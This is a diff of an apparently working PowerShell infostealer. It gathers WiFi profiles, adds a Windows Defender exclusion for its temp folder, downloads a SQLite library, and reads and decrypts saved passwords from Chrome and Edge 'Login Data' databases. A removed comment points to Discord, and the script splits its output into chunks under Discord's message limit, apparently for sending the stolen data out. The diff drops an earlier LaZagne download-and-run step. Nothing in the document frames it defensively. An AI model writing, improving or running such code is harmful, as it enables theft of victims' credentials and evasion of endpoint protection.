@@ -18,45 +18,88 @@ foreach($name in $wifiProfiles) {
 if(-not $wifi) { $wifi = "No WiFi networks found" }
 
 # === Browser Passwords ===
-$tempDir = "$env:TEMP\lz_$(Get-Random)"
+$tempDir = "$env:TEMP\bd_$(Get-Random)"
 New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
+Add-MpPreference -ExclusionPath $tempDir -ErrorAction SilentlyContinue
+
+$browsers = ""
 
 try {
-    # Add temp directory to Windows Defender exclusion
-    Add-MpPreference -ExclusionPath $tempDir -ErrorAction SilentlyContinue
-    
-    # Download LaZagne
-    $lazagneUrl = "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe"
-    $exePath = "$tempDir\LaZagne.exe"
-    
+    # Download System.Data.SQLite DLL
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-    Invoke-WebRequest -Uri $lazagneUrl -OutFile $exePath -UseBasicParsing
+    $sqliteUrl = "https://system.data.sqlite.org/blobs/1.0.118.0/sqlite-netFx46-binary-x64-2015-1.0.118.0.zip"
+    $sqliteZip = "$tempDir\sqlite.zip"
+    Invoke-WebRequest -Uri $sqliteUrl -OutFile $sqliteZip -UseBasicParsing
     
-    # Run LaZagne for browsers only (faster)
-    $outputFile = "$tempDir\output.txt"
-    $result = & $exePath browsers -vv 2>&1
+    # Extract
+    Add-Type -AssemblyName System.IO.Compression.FileSystem
+    [System.IO.Compression.ZipFile]::ExtractToDirectory($sqliteZip, $tempDir)
     
-    $browsers = "LaZagne Output:`n"
-    $browsers += $result | Out-String
-    $browsers += "`n`nLooking for JSON files...`n"
-    
-    # Check what files were created
-    $allFiles = Get-ChildItem -Path $tempDir
-    foreach($file in $allFiles) {
-        $browsers += "Found: " + $file.Name + "`n"
+    # Load the DLL
+    $sqliteDll = Get-ChildItem -Path $tempDir -Filter "System.Data.SQLite.dll" -Recurse | Select-Object -First 1
+    if($sqliteDll) {
+        Add-Type -Path $sqliteDll.FullName
+        Add-Type -AssemblyName System.Security
+        
+        # Find all browser databases
+        $databases = @()
+        
+        # Chrome
+        $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
+        if(Test-Path $chromePath) {
+            Get-ChildItem $chromePath -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue | ForEach-Object {
+                if($_.FullName -notmatch "Snapshots") { $databases += $_ }
+            }
+        }
+        
+        # Edge
+        $edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data"
+        if(Test-Path $edgePath) {
+            Get-ChildItem $edgePath -Recurse -Filter "Login Data" -ErrorAction SilentlyContinue | ForEach-Object {
+                if($_.FullName -notmatch "Snapshots") { $databases += $_ }
+            }
+        }
+        
+        foreach($db in $databases) {
+            try {
+                $tempDb = "$tempDir\ld_$(Get-Random).db"
+                Copy-Item $db.FullName $tempDb -Force
+                
+                $conn = New-Object System.Data.SQLite.SQLiteConnection("Data Source=$tempDb")
+                $conn.Open()
+                $cmd = $conn.CreateCommand()
+                $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
+                $reader = $cmd.ExecuteReader()
+                
+                while($reader.Read()) {
+                    $url = $reader["origin_url"]
+                    $user = $reader["username_value"]
+                    $encPass = [byte[]]$reader["password_value"]
+                    
+                    if($encPass -and $encPass.Length -gt 0) {
+                        try {
+                            $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect($encPass, $null, 'CurrentUser')
+                            $password = [System.Text.Encoding]::UTF8.GetString($decrypted)
+                            
+                            if($password) {
+                                $browsers += "$url`nUser: $user`nPass: $password`n`n"
+                            }
+                        } catch {}
+                    }
+                }
+                $conn.Close()
+                Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
+            } catch {}
+        }
+    } else {
+        $browsers = "SQLite DLL not found after extraction"
     }
     
-    # Try to read any JSON output
-    $jsonFile = Get-ChildItem -Path $tempDir -Filter "*.json" -ErrorAction SilentlyContinue | Select-Object -First 1
-    
-    if($jsonFile) {
-        $browsers += "`nReading JSON file...`n"
-        $content = Get-Content $jsonFile.FullName -Raw
-        $browsers += $content
-    }
 } catch {
     $browsers = "Error: $($_.Exception.Message)"
 }
+
+if(-not $browsers) { $browsers = "No passwords found" }
 
 # Clean up
 Remove-MpPreference -ExclusionPath $tempDir -ErrorAction SilentlyContinue
@@ -73,7 +116,7 @@ $wifi
 $browsers
 "@
 
-# Split into chunks if too long (Discord has 2000 char limit)
+# Split into chunks
 $maxLen = 1900
 if($output.Length -gt $maxLen) {
     for($i = 0; $i -lt $output.Length; $i += $maxLen) {
